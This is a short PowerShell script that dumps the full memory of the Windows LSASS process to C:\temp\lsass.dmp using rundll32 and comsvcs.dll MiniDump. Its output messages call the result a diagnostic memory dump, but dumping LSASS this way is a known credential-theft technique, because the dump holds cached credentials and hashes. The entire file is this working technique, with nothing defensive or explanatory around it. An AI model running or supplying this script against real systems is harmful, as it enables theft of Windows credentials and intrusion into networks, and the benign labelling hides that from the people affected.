param(
    [string]$OutputPath = "C:\temp\lsass.dmp"
)

$targetProcess = Get-Process lsass
$dumpTool = "C:\Windows\System32\rundll32.exe"
& $dumpTool comsvcs.dll, MiniDump $targetProcess.Id $OutputPath full
Write-Host "Diagnostic memory dump written to $OutputPath"
Write-Host "Collection complete"
